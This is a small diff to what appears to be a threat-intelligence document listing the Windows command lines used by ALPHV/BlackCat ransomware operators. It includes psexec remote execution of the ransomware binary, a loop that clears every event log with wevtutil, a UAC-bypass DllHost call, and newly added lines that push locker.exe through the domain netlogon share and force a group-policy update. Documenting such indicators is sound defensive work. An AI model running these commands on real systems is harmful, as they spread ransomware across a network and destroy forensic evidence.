@@ -78,7 +78,9 @@ reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parame
 psexec.exe -accepteula \\<TARGET_HOST> -u <USERNAME> -p <PASSWORD> -s -d -f -c <ALPHV_EXECUTABLE> [FLAGS] [OPTIONS] --access-token <ACCESS_TOKEN> [SUBCOMMAND]
 arp -a
 %SYSTEM32%\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
-for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"" 
+for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""
+/c \\DOMAIN.LOCAL \netlogon\locker.exe --access-token CODE
+gpupdate /force
 ```
 
 ### Linux / VMware ESXi
